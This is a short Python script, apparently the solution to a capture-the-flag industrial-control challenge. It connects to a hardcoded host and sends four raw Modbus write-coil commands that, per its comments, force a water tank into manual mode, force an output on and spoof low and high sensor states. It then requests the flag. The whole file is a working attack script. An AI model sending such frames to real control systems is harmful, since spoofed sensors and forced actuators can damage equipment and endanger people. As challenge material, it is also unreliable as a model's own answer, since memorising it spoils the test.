#!/usr/bin/env python3
"""Official solution sequence from the writeup:
1. Manual Mode:        880500c8FF00   (water tank manual_mode_control ON)
2. force_start_out:    880504d2FF00   (water tank force_start_out ON)
3. Force low sensor OFF: 880500400000 (water tank low_sensor OFF)
4. Force High sensor ON: 35050044FF00 (MIXER high_sensor ON, addr 0x44)
"""
import socket
import time

HOST = "154.57.164.66"
PORT = 30435

CMDS = [
    "880500c8ff00",
    "880504d2ff00",
    "880500400000",
    "35050044ff00",
]


def recv_until_prompt(sock, timeout=8):
    sock.settimeout(timeout)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
            if b"cmd>" in buf:
                break
    except socket.timeout:
        pass
    return buf.decode(errors="replace")


def send(sock, line, timeout=6):
    sock.sendall(line.encode() + b"\n")
    time.sleep(0.15)
    return recv_until_prompt(sock, timeout=timeout)


def main():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    print("BANNER:", recv_until_prompt(sock, timeout=8).strip())

    for cmd in CMDS:
        print(f">>> modbus {cmd}")
        print(send(sock, f"modbus {cmd}").strip())
        print("-" * 70)

    print(">>> system")
    print(send(sock, "system").strip())

    sock.close()


if __name__ == "__main__":
    main()
